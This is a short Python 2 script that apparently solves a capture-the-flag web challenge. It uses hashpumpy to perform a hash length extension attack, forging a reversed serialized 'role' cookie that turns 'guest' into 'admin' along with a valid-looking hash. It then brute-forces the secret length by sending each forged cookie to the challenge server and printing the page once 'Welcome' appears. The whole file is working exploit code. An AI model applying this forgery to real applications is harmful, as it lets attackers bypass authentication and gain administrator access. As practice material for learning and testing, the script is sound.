# -*- coding: utf-8 -*-
import requests,hashpumpy,urllib
def webre(): #py2
    url = 'http://web.jarvisoj.com:32778/'
    sha = '3a4727d57463f122833d9e732f94e4e0'
    string0 = ';"tseug":5:s'
    string1 = ';"nimda":5:s'
    for i in range(15):
        digest, message = hashpumpy.hashpump(sha,string0,string1,i)
        payload ={'role':urllib.quote(message[::-1]), 'hsh':digest}
        #payload ={'role':(message[::-1]), 'hsh':digest}
        print i,payload
        html = requests.get(url,cookies=payload).text#提交答案
        if 'Welcome' in html:
            print html

webre()
